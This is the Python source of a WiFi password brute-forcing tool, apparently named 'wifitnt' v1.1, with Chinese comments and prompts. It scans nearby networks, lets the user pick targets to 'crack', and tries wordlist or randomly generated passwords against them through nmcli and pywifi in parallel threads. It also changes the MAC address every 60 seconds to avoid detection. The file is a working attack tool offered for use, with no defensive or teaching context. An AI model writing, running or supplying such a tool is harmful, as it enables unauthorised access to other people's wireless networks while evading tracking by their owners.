import sys
import os
import time
import random
import threading
import subprocess
import pywifi
from pywifi import const

# ========== 权限检测 ==========
def check_admin():
    if os.geteuid() != 0:
        print("请以 root 权限运行该程序（sudo python3 xxx.py）")
        sys.exit(1)

# ========== 生成随机 MAC ==========
def random_mac():
    return "{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}".format(
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )

# ========== 修改 MAC 地址 ==========
def change_mac(interface_name):
    new_mac = random_mac()
    print(f"[MAC] 正在更换 {interface_name} 的 MAC 地址为: {new_mac}")
    try:
        subprocess.run(f"ip link set dev {interface_name} down", shell=True, check=True)
        subprocess.run(f"ip link set dev {interface_name} address {new_mac}", shell=True, check=True)
        subprocess.run(f"ip link set dev {interface_name} up", shell=True, check=True)
        time.sleep(2)  # 确保网卡重新初始化
    except Exception as e:
        print(f"[MAC] 更换 MAC 地址失败: {e}")

# ========== 系统命令方式连接 WiFi（替代 pywifi） ==========
def connect_with_nmcli(ssid, password, interface_name):
    """使用 nmcli 命令连接 WiFi，更稳定"""
    try:
        # 先断开所有连接
        subprocess.run(["nmcli", "dev", "disconnect", interface_name], 
                      capture_output=True, timeout=10)
        time.sleep(1)
        
        # 删除现有连接配置
        subprocess.run(["nmcli", "con", "delete", ssid], 
                      capture_output=True, timeout=5)
        time.sleep(0.5)
        
        # 尝试连接
        result = subprocess.run([
            "nmcli", "dev", "wifi", "connect", ssid, "password", password,
            "ifname", interface_name
        ], capture_output=True, text=True, timeout=15)
        
        # 检查连接状态
        time.sleep(3)
        status_result = subprocess.run(
            ["nmcli", "-t", "-f", "ACTIVE,SSID", "con", "show", "--active"],
            capture_output=True, text=True, timeout=5
        )
        
        if f"yes:{ssid}" in status_result.stdout:
            return True
        return False
        
    except subprocess.TimeoutExpired:
        return False
    except Exception as e:
        print(f"[NMCLI] 连接错误: {e}")
        return False

# ========== 优化的 WiFi 连接方法 ==========
def try_password_optimized(interface, ssid, pwd):
    """优化的密码尝试方法 - 优先使用系统命令"""
    if found_event.is_set():
        return False
    
    # 优先尝试系统命令（nmcli）
    nmcli_result = connect_with_nmcli(ssid, pwd, interface.name())
    
    if nmcli_result is True:
        # 系统命令成功连接
        print(f"[SUCCESS] 网卡: {interface.name()} | SSID: {ssid} | 密码: {pwd}")
        found_event.set()
        return True
    elif nmcli_result is False:
        # 系统命令连接失败（密码错误等）
        return False
    else:
        # 系统命令不可用或出错，回退到 pywifi
        print(f"[回退] 使用 pywifi 尝试连接 {ssid}")
        return try_password_pywifi(interface, ssid, pwd)

def connect_with_nmcli(ssid, password, interface_name):
    """使用 nmcli 命令连接 WiFi，返回连接状态或错误"""
    try:
        # 检查 nmcli 是否可用
        check_result = subprocess.run(["which", "nmcli"], capture_output=True)
        if check_result.returncode != 0:
            print(f"[NMCLI] nmcli 命令不可用，将使用 pywifi")
            return None  # 表示 nmcli 不可用
        
        # 先断开所有连接
        disconnect_result = subprocess.run(
            ["nmcli", "dev", "disconnect", interface_name], 
            capture_output=True, timeout=10
        )
        time.sleep(1)
        
        # 删除现有连接配置
        subprocess.run(
            ["nmcli", "con", "delete", ssid], 
            capture_output=True, timeout=5
        )
        time.sleep(0.5)
        
        # 尝试连接
        connect_result = subprocess.run([
            "nmcli", "dev", "wifi", "connect", ssid, "password", password,
            "ifname", interface_name
        ], capture_output=True, text=True, timeout=15)
        
        # 检查连接状态
        time.sleep(3)
        status_result = subprocess.run(
            ["nmcli", "-t", "-f", "ACTIVE,SSID", "con", "show", "--active"],
            capture_output=True, text=True, timeout=5
        )
        
        if f"yes:{ssid}" in status_result.stdout:
            return True  # 连接成功
        else:
            return False  # 连接失败（密码错误）
            
    except subprocess.TimeoutExpired:
        print(f"[NMCLI] 连接超时")
        return None  # 超时错误，回退到 pywifi
    except Exception as e:
        print(f"[NMCLI] 连接错误: {e}")
        return None  # 其他错误，回退到 pywifi

def try_password_pywifi(interface, ssid, pwd):
    """使用 pywifi 的备用方法"""
    try:
        # 确保接口状态正常
        if interface.status() == const.IFACE_CONNECTED:
            interface.disconnect()
            time.sleep(2)
        
        # 创建配置文件
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        
        # 清除所有配置
        interface.remove_all_network_profiles()
        time.sleep(1)
        
        # 添加新配置
        tmp_profile = interface.add_network_profile(profile)
        time.sleep(1)
        
        # 尝试连接
        interface.connect(tmp_profile)
        
        # 等待连接结果（延长等待时间）
        for i in range(15):
            if found_event.is_set():
                break
            if interface.status() == const.IFACE_CONNECTED:
                print(f"[SUCCESS] 网卡: {interface.name()} | SSID: {ssid} | 密码: {pwd}")
                found_event.set()
                return True
            time.sleep(1)
        
        # 连接失败，断开重试
        interface.disconnect()
        time.sleep(1)
        
    except Exception as e:
        print(f"[PyWiFi] 连接错误: {e}")
    
    return False

# ========== 工作线程 ==========
found_event = threading.Event()
lock = threading.Lock()

def worker(interface, ssid, passwords):
    """工作线程函数"""
    for pwd in passwords:
        if found_event.is_set():
            break
        try_password_optimized(interface, ssid, pwd)

def mac_changer_thread(interface):
    """MAC地址更换线程"""
    while not found_event.is_set():
        change_mac(interface.name())
        # 每60秒更换一次MAC地址
        for _ in range(60):
            if found_event.is_set():
                break
            time.sleep(1)

# ========== 扫描 WiFi ==========
def scan_wifi(interface):
    """扫描可用WiFi"""
    print(f"[{interface.name()}] 开始扫描...")
    
    # 确保接口处于活动状态
    try:
        subprocess.run(f"ip link set {interface.name()} up", shell=True, check=True)
        time.sleep(2)
    except:
        pass
    
    retries = 3
    for attempt in range(retries):
        try:
            interface.scan()
            time.sleep(8)  # 延长扫描时间
            results = interface.scan_results()
            if results:
                print(f"[{interface.name()}] 扫描完成，找到 {len(results)} 个网络")
                return results
            else:
                print(f"[{interface.name()}] 第 {attempt + 1} 次扫描无结果")
        except Exception as e:
            print(f"[{interface.name()}] 扫描错误: {e}")
        
        if attempt < retries - 1:
            time.sleep(3)
    
    return []

# ========== 主程序 ==========
def main():
    check_admin()

    # 初始化 WiFi
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    
    if not interfaces:
        print("未找到可用的无线网卡")
        sys.exit(1)

    print("可用的无线网卡：")
    for idx, iface in enumerate(interfaces):
        print(f"{idx}: {iface.name()}")

    # 选择网卡
    try:
        choices = input("请选择要使用的无线网卡编号（可用逗号分隔多个）: ")
        choice_list = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit() and int(x.strip()) < len(interfaces)]
        if not choice_list:
            print("未选择有效网卡，退出。")
            sys.exit(1)
    except:
        print("输入格式错误")
        sys.exit(1)

    selected_interfaces = [interfaces[i] for i in choice_list]
    
    # 扫描WiFi
    wifiList = []
    for interface in selected_interfaces:
        results = scan_wifi(interface)
        wifiList.extend(results)

    if not wifiList:
        print("未扫描到任何WiFi网络")
        sys.exit(1)

    # 处理SSID列表
    ssid_dict = {}
    for w in wifiList:
        try:
            ssid = w.ssid.encode('raw_unicode_escape').decode('utf-8', errors='ignore')
            if ssid and ssid.strip():
                signal_strength = 100 + w.signal
                if ssid not in ssid_dict or signal_strength > ssid_dict[ssid][0]:
                    ssid_dict[ssid] = (signal_strength, ssid)
        except:
            continue

    if not ssid_dict:
        print("未找到有效的SSID")
        sys.exit(1)

    wifi_signal_and_name_list = sorted(ssid_dict.values(), key=lambda i: i[0], reverse=True)

    print("\n发现的WiFi网络:")
    for idx, (signal, name) in enumerate(wifi_signal_and_name_list):
        print(f"{idx}\t信号强度: {signal}\tSSID: {name}")

    # 选择模式和目标
    try:
        wifi_indices = input("请选择要破解的WiFi编号（可用逗号分隔多个）: ")
        wifi_index_list = [int(x.strip()) for x in wifi_indices.split(',') if x.strip().isdigit() and int(x.strip()) < len(wifi_signal_and_name_list)]
        if not wifi_index_list:
            print("未选择有效WiFi，退出。")
            sys.exit(1)
        mode = input("请选择密码模式（1-密码本，2-随机生成）: ").strip()
        while mode not in ('1', '2'):
            mode = input("输入有误，请重新选择（1-密码本，2-随机生成）: ").strip()
    except:
        print("输入格式错误")
        sys.exit(1)

    target_ssids = [wifi_signal_and_name_list[i][1] for i in wifi_index_list]

    # 准备密码列表
    if mode == '1':
        password_file = input("请输入密码本路径: ")
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"从密码本加载了 {len(passwords)} 个密码")
        except Exception as e:
            print(f"读取密码本失败: {e}")
            sys.exit(1)
    else:
        try:
            min_len = int(input("随机密码最小长度: "))
            max_len = int(input("随机密码最大长度: "))
            count = int(input("生成密码数量: "))
            charset = input("请输入字符集（留空默认字母数字）: ") or 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
            print("正在生成密码……")
            passwords = [''.join(random.choices(charset, k=random.randint(min_len, max_len))) for _ in range(count)]
            print(f"已生成 {len(passwords)} 个随机密码。")
        except:
            print("参数输入错误")
            sys.exit(1)

    print(f"\n开始破解: {', '.join(target_ssids)}")

    # 启动 MAC 更换线程
    for interface in selected_interfaces:
        threading.Thread(target=mac_changer_thread, args=(interface,), daemon=True).start()

    # 创建工作线程
    num_threads = min(4, len(passwords))  # 减少线程数提高稳定性
    chunk_size = len(passwords) // num_threads + 1
    threads = []
    
    for interface in selected_interfaces:
        for ssid in target_ssids:
            for i in range(num_threads):
                chunk = passwords[i*chunk_size:(i+1)*chunk_size]
                if chunk:
                    t = threading.Thread(target=worker, args=(interface, ssid, chunk))
                    threads.append(t)
                    t.start()
                    time.sleep(0.5)  # 延迟启动线程

    # 等待所有线程完成
    for t in threads:
        t.join()

    if not found_event.is_set():
        print("\n未能破解所选 WiFi。")

def printversion(version):
    print(
'''
Welcome to
 _       ________________   _______   ________
| |     / /  _/ ____/  _/  /_  __/ | / /_  __/
| | /| / // // /_   / /     / / /  |/ / / /   
| |/ |/ // // __/ _/ /     / / / /|  / / /    
|__/|__/___/_/   /___/    /_/ /_/ |_/ /_/ 
https://github.com/xhdndmm/wifitnt
'''
,"version:" , version
)

if __name__ == "__main__":
    printversion("v1.1")
    time.sleep(1)
    main()